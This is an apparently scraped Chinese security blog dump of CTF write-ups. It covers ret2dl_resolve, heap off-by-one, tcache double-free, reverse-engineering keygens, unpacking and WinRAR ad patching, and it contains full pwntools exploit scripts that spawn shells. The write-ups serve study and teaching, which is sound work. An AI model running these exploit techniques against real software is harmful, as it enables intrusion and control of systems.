stdout@@GLIBC_2_0, 4, 11h, 0, 1Ah&gt;LOAD:08048258 Elf32_Sym &lt;offset aIoStdinUsed - offset byte_8048278, \\ ; &quot;_IO_stdin_used&quot;LOAD:08048258 offset _IO_stdin_used, 4, 11h, 0, 10h&gt;LOAD:08048268 Elf32_Sym &lt;offset aStdin - offset byte_8048278, \\ ; &quot;stdin&quot;LOAD:08048268 offset stdin@@GLIBC_2_0, 4, 11h, 0, 1Ah&gt; .dynstr节包含了动态链接的字符串。这个节以\\x00作为开始和结尾，中间每个字符串也以\\x00间隔。 123456789101112131415LOAD:08048278 ; ELF String TableLOAD:08048278 byte_8048278 db 0 ; DATA XREF: LOAD:080481E8↑oLOAD:08048278 ; LOAD:080481F8↑o ...LOAD:08048279 aLibcSo6 db &apos;libc.so.6&apos;,0LOAD:08048283 aIoStdinUsed db &apos;_IO_stdin_used&apos;,0 ; DATA XREF: LOAD:08048258↑oLOAD:08048292 aStdin db &apos;stdin&apos;,0 ; DATA XREF: LOAD:08048268↑oLOAD:08048298 aStrlen db &apos;strlen&apos;,0 ; DATA XREF: LOAD:08048218↑oLOAD:0804829F aRead db &apos;read&apos;,0 ; DATA XREF: LOAD:080481F8↑oLOAD:080482A4 aStdout db &apos;stdout&apos;,0 ; DATA XREF: LOAD:08048248↑oLOAD:080482AB aSetbuf db &apos;setbuf&apos;,0 ; DATA XREF: LOAD:080481E8↑oLOAD:080482B2 aLibcStartMain db &apos;__libc_start_main&apos;,0LOAD:080482B2 ; DATA XREF: LOAD:08048228↑oLOAD:080482C4 aWrite db &apos;write&apos;,0 ; DATA XREF: LOAD:08048238↑oLOAD:080482CA aGmonStart db &apos;__gmon_start__&apos;,0 ; DATA XREF: LOAD:08048208↑oLOAD:080482D9 aGlibc20 db &apos;GLIBC_2.0&apos;,0 Elf32_Sym[2]-&gt;st_name=0x27（.dynsym + Elf32_Sym_size * num），所以.dynstr加上0x27的偏移量，就是字符串read。 .plt节是过程链接表。过程链接表把位置独立的函数调用重定向到绝对位置。 example123456789101112131415161718192021222324int __cdecl main(int argc, const char **argv, const char **envp)&#123; size_t v3; // eax char buf[4]; // [esp+0h] [ebp-6Ch] char v6; // [esp+18h] [ebp-54h] int *v7; // [esp+64h] [ebp-8h] v7 = &amp;argc; strcpy(buf, &quot;Welcome to XDCTF2015~!\\n&quot;); memset(&amp;v6, 0, 0x4Cu); setbuf(stdout, buf); v3 = strlen(buf); write(1, buf, v3); vuln(); return 0;&#125;ssize_t vuln()&#123; char buf; // [esp+Ch] [ebp-6Ch] setbuf(stdin, &amp;buf); return read(0, &amp;buf, 0x100u);&#125; 正常攻击roputils相对而言特别方便的工具，可以自动生成需要伪造的section，并且通过函数调用直接ROP 12345678910111213141516171819202122232425from roputils import *from pwn import processfrom pwn import gdbfrom pwn import contextr = process(&apos;./bof&apos;)context.log_level = &apos;debug&apos;r.recv()rop = ROP(&apos;./bof&apos;)offset = 112bss_base = rop.section(&apos;.bss&apos;)buf = rop.fill(offset)buf += rop.call(&apos;read&apos;, 0, bss_base, 100)## used to call dl_Resolve()buf += rop.dl_resolve_call(bss_base + 20, bss_base)r.send(buf)buf = rop.string(&apos;/bin/sh&apos;)buf += rop.fill(20, buf)## used to make faking data, such relocation, Symbol, Strbuf += rop.dl_resolve_data(bss_base + 20, &apos;system&apos;)buf += rop.fill(100, buf)r.send(buf)r.interactive() 参考链接：http://pwn4.fun/2016/11/09/Return-to-dl-resolve/","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"stack","slug":"stack","permalink":"http://siriuswhiter.tk/tags/stack/"}]},{"title":"kanxueCTF-2019","slug":"kanxuectf-2019","date":"2019-03-14T13:57:23.000Z","updated":"2019-03-15T10:28:23.173Z","comments":true,"path":"2019/03/14/kanxuectf-2019/","link":"","permalink":"http://siriuswhiter.tk/2019/03/14/kanxuectf-2019/","excerpt":"","text":"刚好在学逆向，突然想着可以看一下还在比赛的看雪ctf 流浪者win32 gui 输入注册码，错误会有提示 od 打开，搜索字符串，找到判断结果的函数位置； ida 打开，找到od确定的函数位置，根据ida的交叉引用，找到了判断的函数 1234567891011121314151617181920212223242526sub_401770 proc near ; CODE XREF: sub_4017F0+83↓pBOOL __cdecl sub_4017F0(int a1)&#123; BOOL result; // eax char Str1[28]; // [esp+D8h] [ebp-24h] int v3; // [esp+F4h] [ebp-8h] int v4; // [esp+F8h] [ebp-4h] v4 = 0; v3 = 0; while ( *(_DWORD *)(a1 + 4 * v4) &lt; 62 &amp;&amp; *(_DWORD *)(a1 + 4 * v4) &gt;= 0 ) &#123; Str1[v4] = aAbcdefghiabcde[*(_DWORD *)(a1 + 4 * v4)]; ++v4; &#125; Str1[v4] = 0; if ( !strcmp(Str1, &quot;KanXueCTF2019JustForhappy&quot;) ) result = sub_401770(); else result = sub_4017B0(); return result;&#125;aAbcdefghiabcde db &apos;abcdefghiABCDEFGHIJKLMNjklmn0123456789opqrstuvwxyzOPQRSTUVWXYZ&apos;,0 可以看到就是字符串对应，直接写脚本中间卡了一下就是得到的是数字位置，如19，42什么的，但是输入没法这样，出去溜了个弯，回去在od strcmp之前下了个断点，查看对输入字符串的处理，之后突然意识到可能是 0-9 a-z A-Z 对应，尝试了一下，bingo 脚本： 123456789101112a = &apos;abcdefghiABCDEFGHIJKLMNjklmn0123456789opqrstuvwxyzOPQRSTUVWXYZ&apos;b = &apos;KanXueCTF2019JustForhappy&apos;array = &apos;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&apos;c = &apos;&apos; for i in range(len(b)): for j in range(len(a)): if b[i]== a[j]: c += array[j]print c Repwn中间卡住了。。好在后面还是把解出来了哈哈哈哈，先说下目前的思路 还是先拖进od然后搜索出现的字符串，不记得是用ida还是od找到了判断入口，下断点，同时在ida中找到函数位置，反汇编，可以看到层层嵌套的判断 第一次 判断了13位，也可以因此确定其中的13位：123456789101112131415161718192021222324v1 = 8; v2 = 0; v8 = &apos;ruoY&apos;; v9 = &apos;pnI_&apos;; v10 = &apos;I_tu&apos;; v11 = &apos;rW_s&apos;; v12 = &apos;gno&apos;; v4 = &apos;0Y1X&apos;; v5 = &apos;t3Nu&apos;; v6 = &apos;d00G&apos;; v7 = 0; while ( *((_BYTE *)&amp;v4 + v2) == *(_BYTE *)(v1 + key) ) &#123; ++v2; ++v1; if ( v2 &gt; 11 ) &#123; result = 1; if ( *(_BYTE *)(key + 20) == &apos;H&apos; ) return result; return 0; &#125; &#125; return 0; 第二次,确定了序列长度，同时在检查第三步回来之后还会对最后四位处理，最后会将其覆盖到返回地址。 123456789101112131415if ( strlen(Str) == 24 ) &#123; if ( check3((int)Str) ) &#123; Str[20] -= 88; Str[21] -= 70; Str[22] -= 3; Str[23] -= 107; strcpy(&amp;Dest, Str); &#125; &#125; else &#123; printf(&quot;String Length is Wrong&quot;); &#125; 第三次，也就是最后一次，，deal_8对前八位全部减0x30， 第三次通过计算可以确定第五到八位 12345678910111213141516 deal_8(a1); v1 = no_4 + 1000 * fl[0] + 100 * no_2 + 10 * no_3; v2 = no_6 + 10 * no_5; v3 = no_8 + 10 * no_7; if ( 2 * (v1 + v2) != 4040 || 3 * v2 / 2 + 100 * v3 != 115 )// v1+v2 = 0x7e4 goto LABEL_2; result = 1; if ( v1 - 110 * v3 != 1900 ) &#123; printf(&quot;Key_Is_Wrong,Please_Input_Again!&quot;);LABEL_2: result = 0; &#125; 经过不断的尝试＋猜测，终于试出了flag 120101001X1Y0uN3tG00dHaCk","categories":[{"name":"re","slug":"re","permalink":"http://siriuswhiter.tk/categories/re/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"re","slug":"re","permalink":"http://siriuswhiter.tk/tags/re/"}]},{"title":"bugku-reverse prac","slug":"bugku-reverse-prac","date":"2019-03-13T11:24:58.000Z","updated":"2019-03-13T11:54:57.273Z","comments":true,"path":"2019/03/13/bugku-reverse-prac/","link":"","permalink":"http://siriuswhiter.tk/2019/03/13/bugku-reverse-prac/","excerpt":"","text":"love其实是比较简单的逆向，但是毕竟上手时间短，写一写顺便把思路缕清 题目打开是dos窗口，等待输入flag，随便输入后直接退出 拖入IDA，重点函数 12345678910111213141516171819202122232425262728293031323334353637383940414243__int64 main_0()&#123; int len; // eax const char *v1; // eax size_t real_len; // eax int v3; // edx __int64 v4; // ST08_8 signed int j; // [esp-B0h] [ebp-B0h] signed int i; // [esp-A4h] [ebp-A4h] signed int v8; // [esp-A4h] [ebp-A4h] int v9; // [esp-98h] [ebp-98h] int flag; // [esp-2Ch] [ebp-2Ch] int v11; // [esp-10h] [ebp-10h] int v12; // [esp-4h] [ebp-4h] for ( i = 0; i &lt; 100; ++i ) &#123; if ( (unsigned int)i &gt;= 0x64 ) j____report_rangecheckfailure(); *((_BYTE *)&amp;v12 + i - 0x94) = 0; &#125; puts_(&quot;please enter the flag:&quot;); scanf(&quot;%20s&quot;, &amp;flag); len = j_strlen((const char *)&amp;flag); v1 = (const char *)deal((int)&amp;flag, len, (int)&amp;v11); strncpy((char *)&amp;v9, v1, 40u); v8 = j_strlen((const char *)&amp;v9); for ( j = 0; j &lt; v8; ++j ) *((_BYTE *)&amp;v12 + j - 0x94) += j; real_len = j_strlen((const char *)&amp;v9); if ( !strncmp((const char *)&amp;v9, Str2, real_len) ) puts_(&quot;rigth flag!\\n&quot;); else puts_(&quot;wrong flag!\\n&quot;); HIDWORD(v4) = v3; LODWORD(v4) = 0; return v4;&#125;Str2 db &apos;e3nifIH9b_C@n@dH&apos;,0 分析程序流程也比较清晰，初始时将一段栈内存置为0，可以看到是在v9处，之后请求输入flag，然后对输入的flag deal加密处理然后处理得到的字符串再次每位加i，相当于第二次加密，之后将其与一段字符串相比，相等的话就输出right flag 所以问题的重点其实是第一次加密是怎样处理的，ida中看到一堆abcdef…，想着可能是base64，但是不确定。 将文件拖入x32dbg 先运行起来，然后搜索字符串，找到主函数的位置，根据ida可以知道在第一次加密之后调用了strncpy，所以我们在搜索到wrong flag地址，往上翻，可以大概确定加密的地址，在其之后下断点，运行程序输入任意flag，因为约定函数返回值是存在eax中的，查看此时的eax，发现其值就是输入flag的base64，接下来写脚本就完事了 脚本12345678910111213import base64string=&apos;e3nifIH9b_C@n@dH&apos;unstring = &apos;&apos;for i in range(len(string)): unstring += chr(ord(string[i])-i)flag = base64.b64decode(unstring)print flag$ python lovewp.py &#123;i_l0ve_you&#125;","categories":[{"name":"re","slug":"re","permalink":"http://siriuswhiter.tk/categories/re/"}],"tags":[{"name":"re","slug":"re","permalink":"http://siriuswhiter.tk/tags/re/"}]},{"title":"Reverse Learning-unpack","slug":"reverse-learning-unpack","date":"2019-03-13T07:45:50.000Z","updated":"2019-03-13T09:03:37.042Z","comments":true,"path":"2019/03/13/reverse-learning-unpack/","link":"","permalink":"http://siriuswhiter.tk/2019/03/13/reverse-learning-unpack/","excerpt":"","text":"学习一下基础的软件脱壳，之后慢慢更新 upxtypeupx属于比较经典的压缩壳，支持大多数操作系统运行文件，可以使压缩过的可执行文件体积缩小50%-70% ； 文件位压缩后的运行方式便是在压缩文件的开始加入解压缩的代码，所以程序在运行完解压缩代码之后，程序的代码实际上就与压缩前一致了，而这也是我们可以手动调试脱壳的前提。 pack先下载 upx od 查看文件在upx 之前的内存情况，从开始处，信息比较清楚 未加壳 命令行调用upx 给文件加壳 ./upx.exe filename.exe 再次查看文件情况，当然也可以使用IDA。 加壳 unpack upx自带脱壳命令，加个-d 就是脱壳模式 手动脱壳 文件起始有个pushad将所有寄存器的值入栈，之后从加壳后的文件起始处按f8单步往后走，发现不久后就开始了反复循环 12345678910004079D0 &gt; /8A06 mov al,byte ptr ds:[esi]004079D2 . |46 inc esi ; upxpacke.00407006004079D3 . |8807 mov byte ptr ds:[edi],al004079D5 . |47 inc edi ; upxpacke.00401002004079D6 &gt; |01DB add ebx,ebx004079D8 . |75 07 jnz short upxpacke.004079E1004079DA &gt; |8B1E mov ebx,dword ptr ds:[esi]004079DC . |83EE FC sub esi,-0x4004079DF . |11DB adc ebx,ebx004079E1 &gt;^\\72 ED jb short upxpacke.004079D0 可以看到大概意思就是在疯狂复制esi地址的数据到 edi地址处 而我们只需要找到之后的popad就可以了，所以右键-&gt;serch for-&gt;command 或直接 ctrl+F 寻找popad ，不过这里需要去掉entire block的勾选，否则会找到起始地址之前的popad，找到之后f2下断点，f9直接运行到这里 之后继续单步,一个小循环之后，跳转到一个地址 12345678910111213141500407B66 . 61 popad00407B67 . 8D4424 80 lea eax,dword ptr ss:[esp-0x80]00407B6B &gt; 6A 00 push 0x000407B6D . 39C4 cmp esp,eax00407B6F .^ 75 FA jnz short upxpacke.00407B6B00407B71 . 83EC 80 sub esp,-0x8000407B74 .- E9 C897FFFF jmp upxpacke.0040134100401341 E8 83040000 call upxpacke.004017C900401346 ^ E9 B3FDFFFF jmp upxpacke.004010FE0040134B 8BFF mov edi,edi ; upxpacke.&lt;ModuleEntryPoint&gt;0040134D 55 push ebp0040134E 8BEC mov ebp,esp00401350 81EC 28030000 sub esp,0x328 到达该地址后，可以看到有个call函数，此时就可以使用od 的插件OllyDump将文件脱壳，需要注意的是重建输入表一般会选择方式二，其他的可以根据情况来定，这次保持默认就可以了 ollydump 打开输出的脱壳的文件，找到最初始的地方，发现与脱壳前一样，也就是说脱壳成功 脱壳效果 aspacktype专门针对win32程序的压缩软件，整体原理与upx差不多所以方法实际上是可以通用的。 unpackaspack popad不容易找到，所以可以使用其他的办法来 这里可以确定0x401000是程序本身的初始位置，只是在没有解包之前，这里还无法反汇编。 我们这里使用硬件断点(硬件断点不通过0xCC/int 3h/中断程序运行并向调试器发送报告，而是通过写入DR寄存器来实现；其支持更复杂的中断，但是只能设置四个)，在0x401000处设置一个硬件断点，f9运行，程序到0x401000处停止执行，此时应该已经解包完成，如果没有显示的话按ctrl+A， 使得OD重新分析代码即可","categories":[{"name":"re","slug":"re","permalink":"http://siriuswhiter.tk/categories/re/"}],"tags":[{"name":"re","slug":"re","permalink":"http://siriuswhiter.tk/tags/re/"}]},{"title":"Reverse Learning-Practical practice","slug":"reverse-learning-practical-practice","date":"2019-03-12T14:23:42.000Z","updated":"2019-03-13T07:54:16.887Z","comments":true,"path":"2019/03/12/reverse-learning-practical-practice/","link":"","permalink":"http://siriuswhiter.tk/2019/03/12/reverse-learning-practical-practice/","excerpt":"","text":"这是之前l3c战队逆向的新手训练，本来想以后再搞，但最近又被最为任务下发了，菜的不行，上周什么也没干成，挣扎了一周。还是决定慢慢学习逆向 winRAR 去除广告 拿x64dbg做调试器来达到理解原理并去除广告 打开WinRAR，发现开始就有广告弹出； 使用x64dbg打开WinRAR，按f9直到程序完全加载，即程序看上去就和普通打开时一样； 初始状态 命令行输入 bp DestroyWindow 命令，意思就是在DestroyWindow处下断点，然后关掉广告，调试器会停在断点处； 断点状态 通过栈回溯到调用destroywindow 函数的地方，往上翻找到消息的开头(关于找到广告窗口子函数的开头，可以向上翻，也可以将其地址减去基址/x64dbg在符号中可以看到基址/得到偏移，将其放入IDA，加上IDA基址，找到函数模块，从而确定开头位置)，将其直接跳转至关闭广告窗口； 函数起始 保存patch即可。","categories":[{"name":"re","slug":"re","permalink":"http://siriuswhiter.tk/categories/re/"}],"tags":[{"name":"re","slug":"re","permalink":"http://siriuswhiter.tk/tags/re/"}]},{"title":"0ctf-2018-pwn","slug":"0ctf-2018-pwn","date":"2019-03-11T07:09:35.000Z","updated":"2019-04-18T12:32:13.487Z","comments":true,"path":"2019/03/11/0ctf-2018-pwn/","link":"","permalink":"http://siriuswhiter.tk/2019/03/11/0ctf-2018-pwn/","excerpt":"","text":"babyheap题目整体代码风格与2017 的babyheap基本一致，不过漏洞点变得隐蔽且利用变得困难了 功能： allocate, resize, show, delete 四个功能 指针仍然是通过一通操作被隐蔽了，所以不能打存放指针地址的主意 allocate时：123456printf(&quot;Size: &quot;); size = read_int_8(); if ( size &gt; 0 ) &#123; if ( size &gt; 0x58 ) size = 0x58; 而resize时：1234567printf(&quot;Size: &quot;); LODWORD(v1) = read_int_8(); newsize = v1; if ( (signed int)v1 &gt; 0 ) &#123; v1 = *(_QWORD *)(24LL * idx + a1 + 8) + 1LL; // new size+1 if ( newsize &lt;= v1 ) 存在off-by-one漏洞，其他函数基本没有问题 分析利用off-by-one，修改chunk size，释放chunk，再申请，将未释放的chunk被系统标记为释放，以此泄露libc 之后的思路便是复写malloc_hook ，但是这里需要注意一点： 申请的chunk最终大小最大为0x60，也就是即使千辛万苦将某个chunk的size改为0x70并将其置入链表，也没有任何用，尝试了好久之前却没动脑子，哭了； 所以需要换个思路，可以使用之前三级头招新时出题人的思路：将size放入fastbinY中，然后将chunk分配到main_arena处，修改topchunk为malloc_hook之上，然后再次分配chunk复写malloc_hook即可 这里就没有必要想free_hook了，毕竟free_hook周围全都是’\\x00’，topchunk地址改过去，分配时size检查就没法过了 这种不能查看指针的，需要搞清楚自己申请的释放的都是哪些chunk，不然很容易乱。 exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576from pwn import *context.log_level = &apos;debug&apos;sh = process(&apos;./babyheap&apos;)elf = ELF(&apos;./babyheap&apos;)libc = ELF(&apos;./lib/x86_64-linux-gnu/libc-2.23.so&apos;)def allocate(size): sh.sendlineafter(&apos;Command: &apos;,&apos;1&apos;) sh.sendlineafter(&apos;Size: &apos;,str(size))def resize(idx,size,con): sh.sendlineafter(&apos;Command: &apos;,&apos;2&apos;) sh.sendlineafter(&apos;Index: &apos;,str(idx)) sh.sendlineafter(&apos;Size: &apos;,str(size)) sh.sendlineafter(&apos;Content: &apos;,con)def delete(idx): sh.sendlineafter(&apos;Command: &apos;,&apos;3&apos;) sh.sendlineafter(&apos;Index: &apos;,str(idx))def show(idx): sh.sendlineafter(&apos;Command: &apos;,&apos;4&apos;) sh.sendlineafter(&apos;Index: &apos;,str(idx))allocate(0x18) #0allocate(0x28) #1allocate(0x58) #2allocate(0x18) #3allocate(0x38) #4#---------leak libc addr-------------------------resize(0,0x19,&apos;a&apos;*0x18+p8(0x91))delete(1)allocate(0x28)show(2)sh.recvuntil(&apos;: &apos;)leak_addr = u64(sh.recv(8))print &apos;leak_addr: &apos;+hex(leak_addr)main_arena = leak_addr- 88print &apos;main_arena: &apos;+hex(main_arena)libc_addr = main_arena - 0x3c4b20print &apos;libc_base: &apos;+hex(libc_addr)one_gadget = libc_addr + 0x4526a #gdb.attach(sh)#----------get shell-----------------------------allocate(0x58) #5delete(5)resize(2,0x8,p64(0x41))allocate(0x58) #5#gdb.attach(sh)#allocate(0x18) #6#allocate(0x58) #7resize(5,0x59,&apos;a&apos;*0x58+p8(0x61))#resize(4,0x10,&apos;a&apos;*0x38+p64(0x41))delete(3)allocate(0x58)resize(3,0x20,&apos;a&apos;*0x18+p64(0x41))delete(4)#gdb.attach(sh)resize(3,0x28,&apos;c&apos;*0x18+p64(0x41)+p64(main_arena+0x20))#gdb.attach(sh)allocate(0x38)#gdb.attach(sh)allocate(0x38)resize(6,0x30,&apos;a&apos;*0x28+p64(main_arena-0x20))allocate(0x10)resize(7,0x8,p64(one_gadget))allocate(0x10)sh.interactive() babystack题目ret2_resolve_runtime ， 直接给了溢出，但是无处下手，实际就是ret2resolve 的标准情况，这里也学习一下 https://www.siriuswhiter.tk/2019/03/20/introduction-to-pwn1-4-ret2dl_runtime_resolve/ 123456ssize_t read__()&#123; char buf; // [esp+0h] [ebp-28h] return read(0, &amp;buf, 0x40u);&#125; 分析溢出在bss段伪造resolve结构体，覆盖write为system调用’/bin/sh’ getshell exp1234567891011121314151617181920212223242526272829import sysimport roputilsfrom pwn import *context.log_level = &apos;debug&apos;offset = 44readplt = 0x08048300bss = 0x0804a020vulFunc = 0x0804843Bp = process(&apos;./babystack&apos;)rop = roputils.ROP(&apos;./babystack&apos;)addr_bss = rop.section(&apos;.bss&apos;)# step1 : write sh &amp; resolve struct to bssbuf1 = &apos;A&apos; * offset #44buf1 += p32(readplt) + p32(vulFunc) + p32(0) + p32(addr_bss) + p32(100)p.send(buf1)buf2 = rop.string(&apos;/bin/sh&apos;)buf2 += rop.fill(20, buf2)buf2 += rop.dl_resolve_data(addr_bss+20, &apos;system&apos;)buf2 += rop.fill(100, buf2)p.send(buf2)#gdb.attach(p)#step2 : use dl_resolve_call get system &amp; system(&apos;/bin/sh&apos;)buf3 = &apos;A&apos;*44 + rop.dl_resolve_call(addr_bss+20, addr_bss)p.send(buf3)p.interactive() heapstorm2题目刚开始进行了一通设置，这里需要关注一下123456789101112131415161718192021222324252627282930313233signed __int64 setup()&#123; signed int i; // [rsp+8h] [rbp-18h] int fd; // [rsp+Ch] [rbp-14h] setvbuf(stdin, 0LL, 2, 0LL); setvbuf(_bss_start, 0LL, 2, 0LL); alarm(0x3Cu); puts( &quot; __ __ _____________ __ __ ___ ____\\n&quot; &quot; / //_// ____/ ____/ | / / / / / | / __ )\\n&quot; &quot; / ,&lt; / __/ / __/ / |/ / / / / /| | / __ |\\n&quot; &quot; / /| |/ /___/ /___/ /| / / /___/ ___ |/ /_/ /\\n&quot; &quot;/_/ |_/_____/_____/_/ |_/ /_____/_/ |_/_____/\\n&quot;); puts(&quot;===== HEAP STORM II =====&quot;); if ( !mallopt(1, 0) ) // ban fastbin exit(-1); if ( mmap((void *)0x13370000, 0x1000uLL, 3, 34, -1, 0LL) != (void *)0x13370000 ) exit(-1); fd = open(&quot;/dev/urandom&quot;, 0); if ( fd &lt; 0 ) exit(-1); if ( read(fd, (void *)0x13370800, 0x18uLL) != 24 ) exit(-1); close(fd); MEMORY[0x13370818] = MEMORY[0x13370810]; for ( i = 0; i &lt;= 15; ++i ) &#123; *(_QWORD *)(16 * (i + 2LL) + 0x13370800) = set_ptr((_QWORD *)0x13370800, 0LL); *(_QWORD *)(16 * (i + 2LL) + 0x13370808) = set_size(0x13370800LL, 0LL); &#125; return 0x13370800LL;&#125; 可以注意到 使用mallopt取消了fastbin， 在0x1337000 处 分配了0x1000大小的空间，可读可写，然后从0x13370800处 写入了0x20的随机数据，后面是存储结构，指针＋size 可以在调试时看这块区域的情况： 123456789101112x/20gx 0x133708000x13370800: 0xa16b7989b9c2ea96 0xaf69f4118a3bb7450x13370810: 0x994db09e4d784774 0x994db09e4d784774 --》 view 需要检验的地方0x13370820: 0xa16b2fa20decaa86 0xaf69f4118a3bb75d0x13370830: 0xa16b2fa20decaaa6 0xaf69f4118a3bb75d0x13370840: 0xa16b2fa20decaac6 0xaf69f4118a3bb75d0x13370850: 0xa16b7989b9c2ea96 0xaf69f4118a3bb7450x13370860: 0xa16b7989b9c2ea96 0xaf69f4118a3bb7450x13370870: 0xa16b7989b9c2ea96 0xaf69f4118a3bb7450x13370880: 0xa16b7989b9c2ea96 0xaf69f4118a3bb7450x13370890: 0xa16b7989b9c2ea96 0xaf69f4118a3bb745 后面会将指针，size经过处理存储到这里，指针会与0x13370800处的随机数xor，size会与0x13370808处的随机数xor 主功能有 alloc ， 使用了calloc ，最多16个chunk且会将输入的chunk 的指针与size存储到上面说的地方 size要大于12小于0x01000； update , 再输入的大小要不大于原size-12,输入数据后会将其最后12字节进行填充，很明显有off-by-null; 123456789101112printf(&quot;Size: &quot;);size_ = get_num();if ( size_ &lt;= 0 || size_ &gt; (unsigned __int64)(set_size((__int64)a1, a1[idx + 2].size) - 12) ) return puts(&quot;Invalid Size&quot;);printf(&quot;Content: &quot;);v2 = set_ptr(a1, a1[idx + 2LL].ptr);get_str(v2, size_);v3 = size_ + v2;*(_QWORD *)v3 = &apos;ROTSPAEH&apos;;*(_DWORD *)(v3 + 8) = &apos;II_M&apos;;*(_BYTE *)(v3 + 12) = 0; // off-by-nullreturn printf(&quot;Chunk %d Updated\\n&quot;, (unsigned int)idx); delete 检查存储的size，之后删除, 可以看到处理的比较干净； 123456if ( idx &lt; 0 || idx &gt; 15 || !set_size((__int64)a1, a1[idx + 2].size) ) return puts(&quot;Invalid Index&quot;);v2 = (void *)set_ptr(a1, a1[idx + 2LL].ptr);free(v2);a1[idx + 2LL].ptr = set_ptr(a1, 0LL);a1[idx + 2].size = set_size((__int64)a1, 0LL); view 会检查之前的0x10处的随机数，满足条件才可以view；12if ( (a1[3] ^ a1[2]) != 0x13377331LL ) return puts(&quot;Permission denied&quot;); 分析思路还是比较清晰的，首先利用off-by-null的漏洞通过chunk overlapping 将chunk分配到0x13370800处，修改原先存储的随机数，使得可以使用view函数，同时覆盖下面存储的指针与size，调用view泄露libc基址，再将指针指向malloc_hook处或free_hook处直接getshell； 主要的问题就是利用overlapping做到条件地址写，过程应该会较为复杂； exp12","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"heap","slug":"heap","permalink":"http://siriuswhiter.tk/tags/heap/"},{"name":"stack","slug":"stack","permalink":"http://siriuswhiter.tk/tags/stack/"}]},{"title":"Introduction to pwn2.9-tcache_exploit","slug":"introduction-to-pwn2-9-tcache-exploit","date":"2019-03-02T06:02:54.000Z","updated":"2019-03-02T07:25:12.250Z","comments":true,"path":"2019/03/02/introduction-to-pwn2-9-tcache-exploit/","link":"","permalink":"http://siriuswhiter.tk/2019/03/02/introduction-to-pwn2-9-tcache-exploit/","excerpt":"","text":"为了有个高版本的glibc，宿舍感人网速10k/s下了两天下了20％，还是选择在昨天下了一个ubuntu 18，好在这次环境安装异常稳妥，没有任何报错甚至有点不习惯。。。 Tcacheglibc 在2.26之后加入了tcache机制，之前仅仅大略看了下原理，基本没什么保护，这次h4lo大佬给的是tcache的题目，顺便来练练手，因为保护比fastbin还少，所以利用起来也比较简单。 简单来说，tcache相当于插队插在了fastbin 及 smallbin 前面，内部chunk大小不排序，且最多7个，malloc时优先在里面找，free时优先进入tcache，大小都要小于0x408，当然还有一些其他的机制就不多说了 babytcache题目三个功能 add delete show add 最多九个chunk，固定malloc(0x50)，指针存放在bss段delete 检查idx范围，之后仅仅freeshow puts指针内容 保护：开了NX 及 Canary，No pie,got表可写 分析看上去就是个tcache的练手题目，也基本没有检查 2.27版本的 tcache 甚至没有double free检查，也就是说，现在可以在没有其他chunk的情况下free一个chunk多次进入tcache 所以我们的思路很清晰– double free进入bss段，改变指针泄露libc地址 得到libc地址之后复写got表，getshell. (复写free不成功，不太清楚为什么，复写puts没问题) 需要注意的是，tcache中有一个计数的tc_idx，也就是如果采用double free，会造成尝试分配到heap以外的时候，已经是第三次从tcache中取出chunk，而我们之前仅仅往里面放入了两个chunk，这样计数的tc_idx就会变成-1，结果便是我们可能之后无法再次使用tcache，此时free会略过tcache，malloc查询tcache时便会报错。 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from pwn import *#context.log_level = &apos;debug&apos;sh = process(&apos;./babytcache&apos;)elf = ELF(&apos;./babytcache&apos;)libc = ELF(&apos;/lib/x86_64-linux-gnu/libc-2.27.so&apos;)def add(con): sh.sendlineafter(&apos;&gt;&apos;,&apos;1&apos;) sh.sendlineafter(&apos;content:&apos;,con)def delete(idx): sh.sendlineafter(&apos;&gt;&apos;,&apos;2&apos;) sh.sendlineafter(&apos;index:&apos;,str(idx))def show(idx): sh.sendlineafter(&apos;&gt;&apos;,&apos;3&apos;) sh.sendlineafter(&apos;index:&apos;,str(idx))add(&apos;aaa&apos;)delete(0)delete(0)delete(0)add(p64(0x6020e0+8))add(&apos;aaa&apos;)add(p64(elf.got[&apos;free&apos;])) //保证搞完后tcache没有被破坏show(1)free_addr = u64(sh.recvuntil(&apos;\\n&apos;,drop=True).ljust(8,&apos;\\x00&apos;))print &apos;free_addr: &apos;+hex(free_addr)system_addr = free_addr - libc.symbols[&apos;free&apos;] + libc.symbols[&apos;system&apos;]print &apos;system_addr: &apos;+hex(system_addr)delete(0)delete(0)add(p64(elf.got[&apos;puts&apos;]))add(&apos;/bin/sh&apos;)add(p64(system_addr)) //这个时候tcache已经坏了，但是不影响我们show(0)#gdb.attach(sh)sh.interactive()","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"heap","slug":"heap","permalink":"http://siriuswhiter.tk/tags/heap/"}]},{"title":"2019.2安恒月赛pwn","slug":"2019-2安恒月赛pwn","date":"2019-02-26T14:00:41.000Z","updated":"2019-02-27T08:14:00.925Z","comments":true,"path":"2019/02/26/2019-2安恒月赛pwn/","link":"","permalink":"http://siriuswhiter.tk/2019/02/26/2019-2安恒月赛pwn/","excerpt":"","text":"filesystem题目重点函数123456789101112131415161718192021unsigned __int64 __fastcall checksec(__int64 a1, __int64 a2)&#123; unsigned __int64 v3; // [rsp+8h] [rbp-98h] char s; // [rsp+10h] [rbp-90h] unsigned __int64 v5; // [rsp+98h] [rbp-8h] v5 = __readfsqword(0x28u); memset(&amp;s, 0, 0x80uLL); printf(&quot;Input the Index:&quot;, a2, &amp;s); v3 = get_num(); if ( cnt &gt; v3 ) &#123; snprintf(&amp;s, 0x80uLL, &quot;echo \\&quot;%s\\&quot;| md5sum&quot;, (char *)&amp;ptr + 0x90 * v3 + 0x30); system(&amp;s); &#125; else &#123; puts(&quot;No Such Index&quot;); &#125; return __readfsqword(0x28u) ^ v5;&#125; 分析给了几个函数，看了下没什么用，其中包括一个后门函数，但是限制两个字节且不能是sh，尝试vi提示没有安装，没有办法checksec这边会执行几个指令，想办法绕过就好了，像web题一样 echo “” ; 